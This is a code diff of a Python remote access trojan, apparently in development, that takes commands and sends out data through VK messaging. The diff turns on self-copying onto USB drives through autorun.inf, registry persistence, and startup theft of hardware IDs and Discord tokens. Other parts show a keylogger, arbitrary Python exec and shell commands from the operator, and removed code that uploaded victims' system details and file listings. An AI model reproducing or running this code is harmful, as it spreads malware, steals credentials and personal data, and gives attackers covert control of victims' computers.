@@ -15,7 +15,7 @@ import subprocess  # Console.
 import shutil  # Copy files.
 import atexit  # At exit handler.
 import sys  # System interaction (argv, platform).
-import threading  # Threading for message showing (blocking operation).
+import multiprocessing  # multiprocessing for message showing, drives watching (blocking operation).
 import re  # Expressions for discord.
 import datetime  # Dates for file properties
 
@@ -50,19 +50,19 @@ except ImportError as exception:
 FEATURE_KEYLOGGER_ENABLED: bool = False
 
 # Drives watching (Sends message when user update drive)(Disable drives infection).
-FEATURE_DRIVES_WATCHING_ENABLED: bool = False
+FEATURE_DRIVES_WATCHING_ENABLED: bool = True
 
-# Drives infection (Writes autorun.inf when connect new drive).
-FEATURE_DRIVES_INFECTION_ENABLED: bool = False
+# Drives injection (Writes autorun.inf with executable when connect new drive).
+FEATURE_DRIVES_INJECTION_ENABLED: bool = True
 
 # Registers self to the registry autorun key.
-FEATURE_AUTORUN_ENABLED: bool = False
+FEATURE_AUTORUN_ENABLED: bool = True
 
 # Grabs HWID at the startup (WARNING: Slow, use `get_hwid` command instead)
-FEATURE_STARTUP_HWID_GRABBING_ENABLED: bool = False
+FEATURE_STARTUP_HWID_GRABBING_ENABLED: bool = True
 
 # Grabs Discor information at the startup (WARNING: Slow, use `discord_profile` command instead).
-FEATURE_STARTUP_DISCORD_GRABBING_ENABLED = False
+FEATURE_STARTUP_DISCORD_GRABBING_ENABLED = True
 
 # Other.
 
@@ -78,14 +78,37 @@ DEFAULT_INVALID_TAGS = ["PC", "TAGS_LOADING_ERROR"]
 # System OK code.
 SYSTEM_OK_STATUS_CODE: int = 0
 
-# Drives that we will skip when infecting drives.
-DRIVES_INFECTION_SKIPPED = ("C", "D")
+# Drives that we will skip when injecting drives.
+DRIVES_INJECTION_SKIPPED = ("C", "D")
+
+# Thread for drives watching.
+THREAD_DRIVES_WATCHING: multiprocessing.Process = multiprocessing.Process()
 
 # Not allowes to register self to the registry when running not ".exe" file.
 DISALLOW_NOT_EXECUTABLE_AUTORUN = True
 
 # Version of the tool.
 VERSION = "[Pre-release] 0.5.5"
+
+# Tuple with all platforms (NOT OPERATING SYSTEM) that are supported for the app.
+PLATFORMS_SUPPORTED = ("win32", "linux")
+
+# Tuple with all platforms (NOT OPERATING SYSTEM) that are only partially supported,
+# and just showing debug message for the it.
+PLATFORMS_DEVELOPMENT = ("linux",)
+
+# Work folder.
+# Function: load_config()
+FOLDER: str = ""
+
+# Current directory for the files commands.
+CURRENT_DIRECTORY = os.getcwd()
+
+# Keylogger string.
+KEYLOGGER_BUFFER: str = ""
+
+# `python` command output container.
+OUT = None
 
 
 # Commands.
@@ -106,22 +129,6 @@ CLIENT_NAME: str = "CLIENT_INITIALISATION_ERROR"
 # Client tags.
 # Function load_tags()
 CLIENT_TAGS: typing.List[str] = ["CLIENT_INITIALISATION_ERROR"]
-
-
-# Other.
-
-# Work folder.
-# Function: load_config()
-FOLDER: str = ""
-
-# Current directory for the files commands.
-CURRENT_DIRECTORY = os.getcwd()
-
-# Keylogger string.
-KEYLOGGER_BUFFER: str = ""
-
-# `python` command output container.
-OUT = None
 
 
 # Server.
@@ -198,188 +205,11 @@ class CommandResult:
         """ Returns should we delete file after uploading. """
         return self.__attachment_delete_after_uploading
 
-def spreading_infect_drive(_drive: str) -> None:
-    # @function spreading_infect_drive()
-    # @returns list
-    # @description Function that infects drive with given symbol.
+# Name.
 
-    # TODO: Make autorun folder hidden.
 
-    if not FEATURE_DRIVES_INFECTION_ENABLED:
-        # If infection disabled.
-
-        # Returning.
-        return
-
-    try:
-        # Trying to infect drive.
-
-        if _drive in DRIVES_INFECTION_SKIPPED:
-            # If this drive in skipped drives.
-
-            # Returning and not infecting.
-            return
-
-        # Code below copies trojan executable in secret folder,
-        # And adds this executable in to drive autorun file.
-
-        # Getting executable path.
-        _executable_path = "autorun\\autorun." + executable_get_extension()
-
-        if not os.path.exists(_drive + _executable_path):
-            # If no executable file there (Not infected already).
-
-            # Building path.
-            filesystem_build_path(_drive + _executable_path)
-
-            # Copying executable there.
-            shutil.copyfile(sys.argv[0], _drive + _executable_path)
-
-            # Writing autorun.inf file.
-            with open(_drive + "autorun.inf", "w", encoding="UTF-8") as _autorun:
-                # Opening file.
-
-                # Writing.
-                _autorun.write(f"[AutoRun]\nopen={_executable_path}\n\naction=Autorun\\Autorun")
-    except Exception as _exception:  # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function spreading_infect_drive()! "
-                      f"Full exception information - {_exception}")
-def spreading_thread() -> None:
-    # @function spreading_thread()
-    # @returns None
-    # @description Function for thread of the spreading, spreads virus.
-
-    try:
-        # Trying to spread.
-
-        # Getting list of the all current drives.
-        _current_drives = filesystem_get_drives_list()
-
-        while True:
-            # Infinity loop.
-
-            # Getting latest drives list.
-            _latest_drives = filesystem_get_drives_list()
-
-            # Getting connected and disconnected drives.
-            _connected_drives = list_difference(_latest_drives, _current_drives)
-            _disconnected_drives = list_difference(_current_drives, _latest_drives)
-
-            # Processing connecting of the drives.
-            if _connected_drives:
-                # Notifying server about connecting and infecting.
-                for _drive in _connected_drives:
-                    # For every drive in connected drives.
-
-                    # Server message.
-                    server_message(f"[Spreading] Connected drive {_drive}!")
-                    debug_message(f"[Spreading] Connected drive {_drive}!")
-
-                    # Infecting drive.
-                    spreading_infect_drive(_drive)
-
-            # Processing disconnecting of the drives.
-            if _disconnected_drives:
-                # Notifying server about disconnecting.
-
-                for _drive in _disconnected_drives:
-                    # For every drive in disconnected drives.
-
-                    # Server message.
-                    server_message(f"[Spreading] Disconnected drive {_drive}!")
-                    debug_message(f"[Spreading] Disconnected drive {_drive}!")
-
-            # Updating current drives.
-            _current_drives = filesystem_get_drives_list()
-
-    except Exception as _exception:  # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function spreading_thread()! "
-                      f"Full exception information - {_exception}")
-def spreading_start() -> None:
-    # @function spreading_start()
-    # @returns None
-    # @description Function that starts app spreading.
-
-    if not FEATURE_DRIVES_WATCHING_ENABLED:
-        # If spreading is disabled.
-
-        # Returning.
-        return
-
-    # Starting listening drives.
-    threading.Thread(target=spreading_thread).start()
-def assert_operating_system() -> None:
-    # @function assert_operating_system()
-    # @returns None
-    # @description Function that asserting that operating system,
-    # @description on which current instance of the trojan is launched are supported.
-
-    # Tuple with all platforms (NOT OPERATING SYSTEM) that are supported for the app.
-    _supported_platforms = ("win32", "linux")
-
-    # Tuple with all platforms (NOT OPERATING SYSTEM) that are only partially supported,
-    # and just showing debug message for the it.
-    _development_platforms = ("linux",)
-
-    for _platform in _supported_platforms:
-        # Iterating over all platforms in the supported platforms.
-
-        if sys.platform.startswith(_platform):
-            # If current PC is have this platform (Supported).
-
-            if _platform in _development_platforms:
-                # If this is development platform.
-
-                # Showing debug message.
-                debug_message("You are currently running this app on platform {_platform} "
-                              "which is not fully supported!")
-
-            # Returning from the function as current platform is supported.
-            return
-
-    # Code lines below only executes if code above don't found supported platform.
-
-    # Debug message.
-    debug_message("Oops... You are running app on the platform "
-                  "{sys.platform} which is not supported! Sorry for that!")
-
-    # Raising SystemExit (Exiting code)
-    raise SystemExit
-def save_name() -> None:
-    # @function save_name()
-    # @returns None
-    # @description Function that saves name to the file.
-
-    try:
-        # Trying to save name.
-
-        # Getting path.
-        _path = FOLDER + CONFIG["paths"]["name"]
-
-        # Building path.
-        filesystem_build_path(_path)
-
-        with open(_path, "w", encoding="UTF-8") as _tf:
-            # With opened file.
-
-            # Writing name.
-            _tf.write(str(CLIENT_NAME))
-    except Exception as _exception:  # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function save_name()! "
-                      f"Full exception information - {_exception}")
 def load_name() -> None:
-    # @function load_name()
-    # @returns None
-    # @description Function that loads all name data.
+    """ Loads name data. """
 
     # Globalising name.
     global CLIENT_NAME
@@ -399,197 +229,174 @@ def load_name() -> None:
             try:
                 # Trying to read name.
 
-                # Clearing name.
-                CLIENT_NAME = ""
-
-                with open(path, "r", encoding="UTF-8") as _nf:
+                with open(path, "r", encoding="UTF-8") as name_file:
                     # With opened file.
 
                     # Reading name.
-                    CLIENT_NAME = str(_nf.read())
+                    CLIENT_NAME = str(name_file.read())
+
+                # Reading completed.
+                return
             except Exception as exception:  # noqa
                 # If there is exception occurred.
 
                 # Debug message.
-                debug_message(f"Can`t load name file! Exception: {exception}")
+                debug_message(f"[Name] Failed to load name! Exception - {exception}")
 
-                # Name.
-                CLIENT_NAME = get_ip()["ip"]
-
-                # Saving name.
-                save_name()
-        else:
-            # If we don't have name file.
-
-            # Name.
-            CLIENT_NAME = get_ip()["ip"]
-
-            # Saving name.
-            save_name()
-    except Exception as _exception:  # noqa
+    except Exception as exception:  # noqa
         # If there is exception occurred.
 
         # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function load_name()! "
-                      f"Full exception information - {_exception}")
+        debug_message(f"[Name] Failed to load name! Exception - {exception}")
 
-        # Name.
-        CLIENT_NAME = get_ip()["ip"]  # noqa
-def stealer_steal_data(_force: bool = False):
-    # @function stealer_steal_data()
-    # @returns None
-    # @description Function that steals all the data from the client.
+    # Name.
+    CLIENT_NAME = get_ip()["ip"]
 
-    data: typing.Dict[str, typing.Any] = {}
+    # Saving name.
+    save_name()
+
+    # Message.
+    debug_message(f"[Name] Name was set to default during loading (can`t read)")
+
+
+def save_name() -> None:
+    """ Saves name to the file. """
 
     try:
-        # Trying to steal.
+        # Trying to save name.
 
-        if not stealer_is_already_worked() or _force:
-            # If we not already stolen data or forcing.
+        # Getting path.
+        path = FOLDER + CONFIG["paths"]["name"]
 
-            # Getting file name.
-            _path = FOLDER + CONFIG["paths"]["log"]
+        # Building path.
+        filesystem_build_path(path)
 
-            # Getting ip data.
-            _ip = get_ip()
+        with open(path, "w", encoding="UTF-8") as name_file:
+            # With opened file.
 
-            # Getting path data.
-            _userprofile = os.getenv("userprofile")
-            _drive = os.getcwd().split("\\")[0]
+            # Writing name.
+            name_file.write(str(CLIENT_NAME))
+    except Exception as exception:  # noqa
+        # If there is exception occurred.
 
-            # Writing values.
-            data["internet_ipaddress"] = _ip["ip"]
-            data["internet_city"] = _ip["city"]
-            data["internet_country"] = _ip["country"]
-            data["internet_region"] = _ip["region"]
-            data["internet_provider"] = _ip["org"]
+        # Error.
+        debug_message(f"[Name] Failed to read name! Exception - {exception}")
 
-            if FEATURE_STARTUP_HWID_GRABBING_ENABLED:
-                # If HWID is not disabled.
 
-                # Writing HWID.
-                data["computer_hardware_index"] = get_hwid()
+# Drives Injection.
 
-            if not sys.platform.startswith('linux'):
-                # If not linux.
+def drive_inject_autorun_executable(drive: str) -> None:
+    """ Injects autorun executable. """
 
-                # Windows values.
-                data["computer_username"] = os.getenv("UserName")
-                data["computer_name"] = os.getenv("COMPUTERNAME")
-                data["computer_operating_system"] = os.getenv("OS")
-                data["computer_processor"] = os.getenv("NUMBER_OF_PROCESSORS") + " cores "
-                data["computer_processor"] += os.getenv("PROCESSOR_ARCHITECTURE") + " "
-                data["computer_processor"] += os.getenv("PROCESSOR_IDENTIFIER") + " "
-                data["computer_processor"] += os.getenv("PROCESSOR_LEVEL") + " "
-                data["computer_processor"] += os.getenv("PROCESSOR_REVISION")
-                data["computer_environment_variables"] = get_environment_variables()
-                data["directory_downloads"] = filesystem_try_listdir(_userprofile + "\\Downloads")
-                data["directory_documents"] = filesystem_try_listdir(_userprofile + "\\Documents")
-                data["directory_desktop"] = filesystem_try_listdir(_userprofile + "\\Desktop")
-                data["directory_root"] = filesystem_try_listdir(_drive + "\\")
-                data["directory_programfiles"] = filesystem_try_listdir(_drive + "\\Program Files")
-                data["directory_programfiles86"] = filesystem_try_listdir(_drive + "\\Program Files (x86)")
-                if FEATURE_STARTUP_DISCORD_GRABBING_ENABLED:
-                    data["discord_tokens"] = stealer_steal_discord_tokens()
-                    data["discord_profile"] = stealer_steal_discord_profile(data["discord_tokens"])
+    # TODO: Make autorun folder hidden.
+
+    if not FEATURE_DRIVES_INJECTION_ENABLED:
+        # If injection is disabled.
+
+        # Returning.
+        return
+
+    try:
+        # Trying to inject into the drive.
+
+        if drive in DRIVES_INJECTION_SKIPPED:
+            # If this drive in skipped drives.
+
+            # Returning and not infecting.
+            return
+
+        # Code below copies running executable in secret folder,
+        # And adds this executable in to drive autorun file.
+
+        # Getting executable path.
+        executable_path = "autorun\\autorun." + executable_get_extension()
+
+        if not os.path.exists(drive + executable_path):
+            # If no executable file there (Not infected already).
 
             # Building path.
-            filesystem_build_path(_path)
+            filesystem_build_path(drive + executable_path)
 
-            with open(_path, "w", encoding="UTF-8") as _file:
-                # With opened file.
+            # Copying executable there.
+            shutil.copyfile(sys.argv[0], drive + executable_path)
 
-                # Dumping.
-                json.dump(data, _file, indent=4)
+            # Writing autorun.inf file.
+            with open(drive + "autorun.inf", "w", encoding="UTF-8") as autorun_file:
+                # Opening file.
 
-            for _peer in CONFIG["server"]["vk"]["peers"]:
-                # For every peer in peers.
-
-                # Uploading document.
-                uploading_status, uploading_result = server_upload_document(_path, "Log File", _peer, "doc")
-
-                # Message.
-                if uploading_status and isinstance(uploading_result, str):
-                    # If all is ok.
-
-                    # Message.
-                    server_message(f"[Stealer] Stolen data:", uploading_result, _peer)
-                else:
-                    # If there is error.
-
-                    # Message.
-                    server_message(f"[Stealer] Error when uploading stolen data: {uploading_result}", None, _peer)
-
-            # Returning value.
-            return data
-    except Exception as _exception:  # noqa
+                # Writing.
+                autorun_file.write(f"[AutoRun]\nopen={executable_path}\n\naction=Autorun\\Autorun")
+    except Exception as exception:  # noqa
         # If there is exception occurred.
 
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function steal_data()! "
-                      f"Full exception information - {_exception}")
+        # Error.
+        debug_message(f"[Drive Inject] Error when trying to inject drive! Exception - {exception}")
 
-        # Returning value.
-        return {_exception}
-def server_upload_photo(_path: str) -> str:
-    # @function server_upload_photo()
-    # @returns str
-    # @description Function that  uploads photo on the server.
 
-    # Getting uploader.
-    _uploader = vk_api.upload.VkUpload(SERVER_API)
+# Drives watching.
 
-    # Uploading photo.
-    _photo = _uploader.photo_messages(_path)
-    _photo = _photo[0]
-
-    if "owner_id" in _photo and "id" in _photo and "access_key" in _photo:
-        # If photo have all those fields.
-
-        # Getting photo fields.
-        _owner_id = _photo['owner_id']
-        _photo_id = _photo['id']
-        _access_key = _photo['access_key']
-
-        # Returning photo URN.
-        return f'photo{_owner_id}_{_photo_id}_{_access_key}'
-
-    # Returning blank.
-    return ""
-def execute_python(_code: str, _globals: typing.Dict, _locals: typing.Dict) -> any:
-    # @function server_upload_photo()
-    # @returns any
-    # @description Function that executes python code and returns it out in variable out.
-
-    # Getting global out.
-    global OUT
-
-    # Getting clean code.
-    clean_code = _code.replace("&gt;", ">").replace("&lt;", "<").replace('&quot;', "'").replace('&tab', '   ')
+def drives_watching_thread() -> None:
+    """ Thread function that do drives watching and also infecting it if enabled. """
 
     try:
-        # Trying to execute.
+        # Trying to spread.
 
-        # Executing replaced code.
-        exec(clean_code, _globals, _locals)
+        # Getting list of the all current drives.
+        current_drives = filesystem_get_drives_list()
+
+        while True:
+            # Infinity loop.
+
+            # Getting latest drives list.
+            latest_drives = filesystem_get_drives_list()
+
+            # Getting connected and disconnected drives.
+            connected_drives = list_difference(latest_drives, current_drives)
+            disconnected_drives = list_difference(current_drives, latest_drives)
+
+            # Processing connecting of the drives.
+            for drive in connected_drives:
+                # For every drive in connected drives.
+
+                # Server message.
+                server_message(f"[Spreading] Connected drive {drive}!")
+                debug_message(f"[Spreading] Connected drive {drive}!")
+
+                # Inject autorun executable to the drive.
+                drive_inject_autorun_executable(drive)
+
+            # Processing disconnecting of the drives.
+            for drive in disconnected_drives:
+                # For every drive in disconnected drives.
+
+                # Server message.
+                server_message(f"[Spreading] Disconnected drive {drive}!")
+                debug_message(f"[Spreading] Disconnected drive {drive}!")
+
+            # Updating current drives.
+            current_drives = filesystem_get_drives_list()
     except Exception as exception:  # noqa
-        # If there is an error.
+        # If there is exception occurred.
+
+        # Error.
+        debug_message(f"[Drives Watching] Error when watching drives! Exception - {exception}")
+
+
+def drives_waching_start() -> None:
+    """ Starts drive watching. """
+
+    if not FEATURE_DRIVES_WATCHING_ENABLED:
+        # If drives watching is disabled.
 
         # Returning.
-        return f"Python code exception: {exception}"
+        return
 
-    try:
-        # Trying to return out.
+    # Global thread.
+    global THREAD_DRIVES_WATCHING
 
-        # Returning out.
-        return OUT
-    except NameError:
-        # If there is an name error.
-
-        # Returning.
-        return f"Python code does not return output! Write in out"
-
+    # Starting watching drives.
+    THREAD_DRIVES_WATCHING = multiprocessing.Process(target=drives_watching_thread, args=())
+    THREAD_DRIVES_WATCHING.start()
 
 # Commands.
 
@@ -725,7 +532,7 @@ def command_download(arguments, _) -> CommandResult:
 
             # If invalid size.
             return CommandResult("Too big file to download! Maximal size for download: 1536MB (1.5GB)")
-        elif os.path.isdir(path):
+        if os.path.isdir(path):
             # If this is directory.
 
             if filesystem_get_size(path) < 1536:
@@ -764,7 +571,7 @@ def command_message(arguments: str, _) -> CommandResult:
         return CommandResult("This command does not supported on selected PC! (ctypes module is not installed)")
 
     # Getting arguments.
-    if (arguments := arguments.split(";")) and len(arguments) == 0:
+    if (arguments_list := arguments.split(";")) and len(arguments_list) == 0:
         # If there is no arguments.
 
         # Message
@@ -775,16 +582,16 @@ def command_message(arguments: str, _) -> CommandResult:
         # Trying to show message.
 
         # Arguments check ([text: str, title: str, type: int])
-        message_parameters: typing.List[typing.Union[str, int]] = arguments
+        message_parameters: typing.List[typing.Union[str, int]] = arguments_list
 
         # Process optional parameters.
-        if len(arguments) <= 0:
+        if len(arguments_list) <= 0:
             # Text.
             message_parameters.append("")
-        if len(arguments) <= 1:
+        if len(arguments_list) <= 1:
             # Title.
             message_parameters.append("")
-        if len(arguments) <= 2:
+        if len(arguments_list) <= 2:
             # Type.
             message_parameters.append(0)
 
@@ -792,10 +599,10 @@ def command_message(arguments: str, _) -> CommandResult:
         message_parameters[2] = int(message_parameters[2])
 
         # Creating thread.
-        threading.Thread(
+        multiprocessing.Process(
             # First argument, is hWND. That is not required.
-            #
-            target=lambda: ctypes.windll.user32.MessageBoxW(0, *message_parameters)
+            target=ctypes.windll.user32.MessageBoxW,
+            args=(0, *message_parameters)
         ).start()
 
     except Exception as exception:  # noqa
@@ -818,7 +625,7 @@ def command_tags_new(arguments, _) -> CommandResult:
         return CommandResult("Incorrect arguments! Example: (tags separated by ;)")
 
     # Tags that was added.
-    new_tags = list(set([tag.replace(" ", "-") for tag in arguments]))
+    new_tags = list({tag.replace(" ", "-") for tag in arguments})
 
     if len(new_tags) != 0:
         # If tags was added.
@@ -842,17 +649,14 @@ def command_tags_new(arguments, _) -> CommandResult:
 def command_tags_add(arguments: str, _) -> CommandResult:
     """ Command `tags_add` that adds tags to current. """
 
-    if (arguments := arguments.split(";")) and len(arguments) == 0:
+    if (arguments_list := arguments.split(";")) and len(arguments_list) == 0:
         # If no arguments.
 
         # Message.
         return CommandResult("Incorrect tags arguments! Example: (tags separated by ;)")
 
-    # Globalising tags.
-    global CLIENT_TAGS
-
     # Clean tags.
-    tags = [tag.replace(" ", "-") for tag in arguments]
+    tags = [tag.replace(" ", "-") for tag in arguments_list]
 
     # Add tags.
     CLIENT_TAGS.extend(tags)
@@ -939,14 +743,14 @@ def command_properties(arguments, _) -> CommandResult:
             f"Created: {property_created_at},\n"
             f"Accessed: {property_accessed_at}."
         )
-    else:
-        # If not exists.
 
-        if os.path.exists(FOLDER + path):
-            # Try relative.
+    # If not exists.
 
-            # Call for relative.
-            return command_properties(FOLDER + path, _)
+    if os.path.exists(FOLDER + path):
+        # Try relative.
+
+        # Call for relative.
+        return command_properties(FOLDER + path, _)
 
     # Error.
     return CommandResult("Path does not exists!")
@@ -1005,31 +809,31 @@ def command_cd(arguments, _) -> CommandResult:
 
         # Message.
         return CommandResult(f"Changed directory to {CURRENT_DIRECTORY}")
-    else:
-        # If not local path.
-        if os.path.exists(path):
-            # If path exists - moving there.
 
-            if not os.path.isdir(path):
-                # If not directory.
+    # If not local path.
+    if os.path.exists(path):
+        # If path exists - moving there.
 
-                # Error.
-                return CommandResult("Can`t change directory to the filename")
+        if not os.path.isdir(path):
+            # If not directory.
 
-            if path == "":
-                # If no arguments.
+            # Error.
+            return CommandResult("Can`t change directory to the filename")
 
-                # Message.
-                return CommandResult(f"Current directory - {CURRENT_DIRECTORY}")
-
-            # Changing.
-            CURRENT_DIRECTORY = path
+        if path == "":
+            # If no arguments.
 
             # Message.
-            return CommandResult(f"Changed directory to {CURRENT_DIRECTORY}")
+            return CommandResult(f"Current directory - {CURRENT_DIRECTORY}")
+
+        # Changing.
+        CURRENT_DIRECTORY = path
 
         # Message.
-        return CommandResult(f"Directory {path} does not exists!")
+        return CommandResult(f"Changed directory to {CURRENT_DIRECTORY}")
+
+    # Message.
+    return CommandResult(f"Directory {path} does not exists!")
 
 
 def command_location(*_) -> CommandResult:
@@ -1206,7 +1010,7 @@ def command_link(arguments, _) -> CommandResult:
         # If OK.
 
         # Message.
-        return CommandResult(f"Link was opened (Via system, native)!")
+        return CommandResult("Link was opened (Via system, native)!")
 
     # Error..
     return CommandResult(f"Link was not opened! (Non-zero exit code {console_response})")
@@ -1247,7 +1051,7 @@ def command_taskkill(arguments, _) -> CommandResult:
         # If OK
 
         # OK Mesasge.
-        return CommandResult(f"Task successfully killed!")
+        return CommandResult("Task successfully killed!")
 
     # Error.
     return CommandResult(f"Unable to kill task, there is some error? (Non-zero exit code {console_response})")
@@ -1263,8 +1067,37 @@ def command_upload(*_) -> CommandResult:
 def command_python(arguments, _) -> CommandResult:
     """ Command `python` that executes python code. """
 
-    # Executing.
-    return CommandResult(execute_python(arguments, globals(), locals()))
+    # Getting global out.
+    global OUT
+
+    # Getting source code.
+    python_source_code = arguments.\
+        replace("&gt;", ">").\
+        replace("&lt;", "<").\
+        replace("&quot;", "'").\
+        replace("&tab", "   ")
+
+    try:
+        # Trying to execute.
+
+        # Executing code.
+        exec(python_source_code, globals(), None)
+    except Exception as exception:  # noqa
+        # If there is an error.
+
+        # Returning.
+        return CommandResult(f"Python code execution exception: {exception}")
+
+    try:
+        # Trying to return out.
+
+        # Returning out.
+        return CommandResult(str(OUT))
+    except NameError:
+        # If there is an name error.
+
+        # Returning.
+        return CommandResult("Python code does not return output! Write in OUT variable.")
 
 
 def command_tags(*_) -> CommandResult:
@@ -1306,17 +1139,22 @@ def command_discord_profile(*_) -> CommandResult:
 
         # Returning.
         return CommandResult(
-            f"[ID{profile['id']}]\n[{profile['email']}]\n[{profile['phone']}]\n{profile['username']}" + avatar
+            f"[ID{profile['id']}]\n[{profile['email']}]\n[{profile['phone']}]\n{profile['username']}" +
+            avatar if avatar else ""
         )
-    else:
-        # If can`t get.
 
-        # Error.
-        return CommandResult("Failed to get Discord profile!")
+    # If can`t get.
+
+    # Error.
+    return CommandResult("Failed to get Discord profile!")
 
 
 def command_exit(*_) -> CommandResult:
     """ Command `exit` that exists app. """
+
+    # Kill thread for drives watching to exit.
+    if isinstance(THREAD_DRIVES_WATCHING, multiprocessing.Process):
+        THREAD_DRIVES_WATCHING.terminate()
 
     # Exiting.
     sys.exit(0)
@@ -1401,7 +1239,7 @@ def command_console(arguments, _) -> CommandResult:
     # Executing system and returning result.
     if console_response == SYSTEM_OK_STATUS_CODE:
         # If OK
-        
+
         # OK Mesasge.
         return CommandResult(f"Console status code: OK (Exit code {console_response})")
 
@@ -1414,14 +1252,14 @@ def command_console(arguments, _) -> CommandResult:
 def execute_command(command_name: str, arguments: str, event) -> CommandResult:
     """ Function that executes command and return it result. """
 
-    for command in COMMANDS_FUNCTIONS:
+    for command, function in COMMANDS_FUNCTIONS.items():
         # For all commands names in commands dict.
 
         if command_name == command:
             # If it is this commands.
 
             # Executing command and returning result.
-            result: CommandResult = COMMANDS_FUNCTIONS[command](arguments, event)
+            result: CommandResult = function(arguments, event)
             return result
 
     # Default answer.
@@ -1497,7 +1335,6 @@ def process_message(event) -> None:
                         # Get attachment.
                         command_result_attachment = command_result.get_attachment()
 
-
                         if command_result_attachment is not None:
                             # If response is attachment.
 
@@ -1506,10 +1343,18 @@ def process_message(event) -> None:
 
                             if uploading_type == "photo":
                                 # If this is just photo.
+                                # Uploading file on the server.
+                                uploading_status, uploading_result = \
+                                    server_upload_photo(uploading_path)
 
-                                # Upload photo.
-                                answer_text = uploading_title
-                                answer_attachment = server_upload_photo(uploading_path)
+                                if uploading_status:
+                                    # If uploading is successful.
+                                    answer_text = uploading_title
+                                    answer_attachment = uploading_result
+                                else:
+                                    # Error.
+                                    # Setting response.
+                                    answer_text = f"Error when uploading photo. Result - {uploading_result}"
                             elif uploading_type in ("doc", "audio_message"):
                                 # If this is document or audio message.
 
@@ -1624,7 +1469,7 @@ def keylogger_callback_event(keyboard_event):
         # Globalising keylogger string.
         global KEYLOGGER_BUFFER
 
-        if type(keyboard_key) == str:
+        if isinstance(keyboard_key, str):
             # If this is string.
             if len(keyboard_key) > 1:
                 # If this is not the only 1 char.
@@ -1666,7 +1511,7 @@ def keylogger_callback_event(keyboard_event):
         # If there is exception occurred.
 
         # Showing debug message to the developer.
-        debug_message("[Keylogger] Failed to process keyboard event! Exception - {exception}")
+        debug_message(f"[Keylogger] Failed to process keyboard event! Exception - {exception}")
 
 
 # Server.
@@ -1678,12 +1523,6 @@ def server_connect() -> None:
     global SERVER_API
     global SERVER_LONGPOLL
 
-    # Debug message.
-    debug_message(f"[Server] Connecting to the server...")
-
-    # Base server type.
-    server_type = None
-
     try:
         # Trying to connect to server.
 
@@ -1691,18 +1530,15 @@ def server_connect() -> None:
             # If not CONFIG server type key.
 
             # Error.
-            debug_message(f"[Server] Failed to get configuration server->type value key! "
-                          f"Please check configuration file!")
+            debug_message("[Server] Failed to get configuration server->type value key! "
+                          "Please check configuration file!")
             sys.exit(1)
 
         # Reading server type.
         server_type = CONFIG["server"]["type"]
-        
+
         if server_type in ("VK_USER", "VK_GROUP"):
             # If one of the VK server type.
-
-            # Debug message.
-            debug_message(f"[Server] Selected VK \"{server_type}\" server type...")
 
             # Get CONFIG server access token.
             access_token = CONFIG["server"]["vk"]["user" if server_type == "VK_USER" else "group"]["access_token"]
@@ -1733,13 +1569,13 @@ def server_connect() -> None:
             # Error.
             debug_message(f"[Server] Failed to connect with current server type, "
                           f"as it may be not implemented / exists. Server type - {server_type}")
-            exit(1)
+            sys.exit(1)
     except Exception as exception:  # noqa
         # If there is exception occurred.
 
         # Error.
         debug_message(f"[Server] Failed to connect with server! Exception - {exception}")
-        exit(1)
+        sys.exit(1)
 
     # Debug message.
     debug_message(f"[Server] Connected to the server with type - {server_type}")
@@ -1752,21 +1588,18 @@ def server_listen() -> None:
         # If server longpoll is not connected.
 
         # Error.
-        debug_message(f"[Server] Failed to start server listening as server longpoll is not connected!")
-        exit(1)
+        debug_message("[Server] Failed to start server listening as server longpoll is not connected!")
+        sys.exit(1)
 
     if "server" not in CONFIG or "type" not in CONFIG["server"]:
         # If not CONFIG server type key.
 
         # Error.
-        debug_message(f"[Server] Failed to get configuration server->type value key! Please check configuration file!")
-        exit(1)
+        debug_message("[Server] Failed to get configuration server->type value key! Please check configuration file!")
+        sys.exit(1)
 
     # Reading server type.
     server_type = CONFIG["server"]["type"]
-    
-    # Message.
-    debug_message("[Server] Starting listening...")
 
     if server_type in ("VK_USER", "VK_GROUP"):
         # If one of the VK server type.
@@ -1796,7 +1629,7 @@ def server_listen() -> None:
 
                         # Processing client-server answer.
                         process_message(event)
-                    
+
             except Exception as exception:  # noqa
                 # If there is exception occurred.
 
@@ -1808,7 +1641,7 @@ def server_listen() -> None:
         # Error.
         debug_message(f"[Server] Failed to listen with current server type, as it may be not implemented / exists. "
                       f"Server type - {server_type}")
-        exit(1)
+        sys.exit(1)
 
 
 def server_method(method: str, parameters: typing.Dict, is_retry=False) -> typing.Optional[typing.Any]:
@@ -1845,11 +1678,11 @@ def server_method(method: str, parameters: typing.Dict, is_retry=False) -> typin
 
             # Returning.
             return None
-        else:
-            # If this is not retry.
 
-            # Retrying.
-            return server_method(method, parameters, True)
+        # If this is not retry.
+
+        # Retrying.
+        return server_method(method, parameters, True)
 
 
 def server_message(text: str, attachmment: str = None, peer: int = None) -> None:
@@ -1879,6 +1712,30 @@ def server_message(text: str, attachmment: str = None, peer: int = None) -> None
         "attachment": attachmment,
         "peer_id": peer
     })
+
+
+def server_upload_photo(path: str) -> typing.Tuple[bool, str]:
+    """ Uploads photo to the server. """
+
+    # Getting uploader.
+    server_uploader = vk_api.upload.VkUpload(SERVER_API)
+
+    # Uploading photo.
+    photo, *_ = server_uploader.photo_messages(path)
+
+    if all(key in photo for key in ("owner_id", "id", "access_key")):
+        # If photo have all those fields.
+
+        # Getting photo fields.
+        owner_id = photo["owner_id"]
+        photo_id = photo["id"]
+        access_key = photo["access_key"]
+
+        # Returning photo URN.
+        return True, f"photo{owner_id}_{photo_id}_{access_key}"
+
+    # Returning error.
+    return False, ""
 
 
 def server_upload_document(path: str, title: str, peer: int, document_type: str = "doc") -> \
@@ -1920,14 +1777,14 @@ def server_upload_document(path: str, title: str, peer: int, document_type: str 
 
             # Returning document.
             return True, f"doc{document_owner_id}_{document_id}"
-        else:
-            # If there is not all fields.
 
-            # Debug message.
-            debug_message(f"[Server] Error when uploading document (Request)! Request - {request}")
+        # If there is not all fields.
 
-            # Returning request as error.
-            return False, "Request Error" + str(request)
+        # Debug message.
+        debug_message(f"[Server] Error when uploading document (Request)! Request - {request}")
+
+        # Returning request as error.
+        return False, "Request Error" + str(request)
